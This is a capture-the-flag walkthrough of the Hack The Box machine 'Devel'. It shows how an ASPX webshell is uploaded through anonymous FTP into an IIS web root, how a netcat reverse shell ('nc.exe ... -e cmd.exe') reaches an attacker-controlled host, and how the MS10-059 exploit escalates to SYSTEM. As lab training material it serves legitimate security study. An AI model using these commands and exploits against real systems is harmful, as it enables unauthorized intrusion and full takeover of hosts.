# [devel](https://app.hackthebox.com/machines/3)

> A Windows machine serving a Microsoft FTP server that allows anonymous write access to its IIS web root. By writing an ASP.NET webshell into the web root via this anonymous access, a low-privilege shell can be obtained. The machine's operating system is vulnerable jto MS10-059, which can be exploited for a shell as `NT Authority\SYSTEM`.

---

## Open Port Enumeration

The target is serving TCP ports 21 and 80.

```bash
$ sudo masscan -p1-65535 10.129.151.103 --rate=1000 -e tun0 --output-format grepable --output-filename enum/devel.masscan
$ cat enum/devel.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
21,80, 
```

The target's operating system appears to be Windows. On port 21, its FTP server allows anonymous access to what appears to be the web server root. On port 80, its web server appears to be IIS.

```bash
$ sudo nmap -sC -sV -O -p21,80 10.129.151.103 -oA enum/devel
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-03 15:39 UTC
Nmap scan report for 10.129.151.103
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.75 seconds
```

---

## Upload to Webshell Web Root via FTP

The target's FTP server appears to be serving the IIS web root on port 80.

```txt
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
```

![](images/Pasted%20image%2020220203154618.png)

![](images/Pasted%20image%2020220203154643.png)

The anonymous user has write access to the web root.

```bash
$ touch notes.txt
$ ftp
ftp> open 10.129.151.103
Connected to 10.129.151.103.
220 Microsoft FTP Service
Name (10.129.151.103:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put notes.txt
local: notes.txt remote: notes.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
02-03-22  05:48PM                    0 notes.txt
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> del notes.txt
250 DELE command successful.
```

Write the ASP.NET webshell from `/usr/share/webshells/aspx/cmdasp.aspx` (on Kali) to the web root via FTP.

```bash
$ cp /usr/share/webshells/aspx/cmdasp.aspx .
$ mv cmdasp.aspx tgihf.aspx
$ ftp 10.129.151.103
Connected to 10.129.151.103.
220 Microsoft FTP Service
Name (10.129.151.103:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put tgihf.aspx
local: tgihf.aspx remote: tgihf.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1442 bytes sent in 0.00 secs (32.7428 MB/s)
```

Navigate to the webshell in a browser.

![](images/Pasted%20image%2020220203160159.png)

Start a `netcat` listener and serve a Windows `netcat` binary on an SMB share.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

```bash
$ sudo impacket-smbserver tgihf /usr/share/windows-binaries/ -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Execute the following command in the webshell:

```batch
\\10.10.14.139\tgihf\nc.exe -nv 10.10.14.139 443 -e cmd.exe
```

Receive the reverse shell as the `iis appool\web` user.

```batch
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.139] from (UNKNOWN) [10.129.151.103] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

---

## MS10-059 Privilege Escalation

According to [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), the target may have several local privilege escalation vulnerabilities, including MS10-059.

```bash
$ python /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database /opt/Windows-Exploit-Suggester/2022-02-03-mssb.xls --systeminfo systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
[*] there are now 179 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 32-bit'
[*]
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

Stage the exploit binary from [the Windows Kernel Exploits Githug repository](https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS10-059/MS10-059.exe) to the target.

Start a `netcat` listener on the attacking machine.

```bash
$ sudo nc -nlvp 53
listening on [any] 53 ...
```

Run the exploit with the IP address and port of the reverse shell listener on the attacking machine.

```batch
c:\inetpub\wwwroot>.\MS10-059.exe 10.10.14.139 53
```

```bash
$ sudo nc -nlvp 53
listening on [any] 53 ...
connect to [10.10.14.139] from (UNKNOWN) [10.129.151.103] 49175
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\inetpub\wwwroot>whoami
whoami
nt authority\system
```
